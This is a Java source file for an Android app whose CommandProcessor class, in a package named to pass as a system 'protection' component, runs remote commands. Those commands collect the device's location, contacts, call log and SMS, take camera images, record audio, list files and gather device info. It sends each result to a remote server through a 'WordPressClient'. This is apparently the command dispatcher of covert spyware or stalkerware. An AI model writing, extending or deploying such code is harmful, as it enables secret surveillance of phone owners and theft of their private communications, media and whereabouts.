package com.android.system.protection.api;

import android.content.Context;

import com.android.system.protection.commands.*;

import org.json.JSONObject;

public class CommandProcessor {

    public static void processCommand(Context context, String command, JSONObject params, String commandId) {
        new Thread(() -> {
            try {
                switch (command) {
                    case "get_location":
                        LocationFetcher.fetch(context, params, commandId);
                        break;
                    case "get_contacts":
                        ContactsFetcher.fetch(context, params, commandId);
                        break;
                    case "get_call_log":
                        CallLogFetcher.fetch(context, params, commandId);
                        break;
                    case "get_sms":
                        SmsFetcher.fetch(context, params, commandId);
                        break;
                    case "capture_image":
                        CameraCapture.capture(context, params, commandId);
                        break;
                    case "record_audio":
                        AudioRecorder.record(context, params, commandId);
                        break;
                    case "list_files":
                        FileLister.list(context, params, commandId);
                        break;
                    case "device_info":
                        DeviceInfoCollector.collect(context, params, commandId);
                        break;
                    case "show_message":
                        ShowMessage.show(context, params, commandId);
                        break;
                    default:
                        JSONObject error = new JSONObject();
                        error.put("error", "Unknown command");
                        sendResult(context, commandId, error);
                }
            } catch (Exception e) {
                e.printStackTrace();
                try {
                    JSONObject error = new JSONObject();
                    error.put("error", e.getMessage());
                    sendResult(context, commandId, error);
                } catch (Exception ex) {}
            }
        }).start();
    }

    public static void sendResult(Context context, String commandId, JSONObject result) {
        WordPressClient.sendResult(context, commandId, result, new WordPressClient.Callback() {
            @Override
            public void onSuccess(String response) {}

            @Override
            public void onFailure(Exception e) {
                e.printStackTrace();
            }
        });
    }
}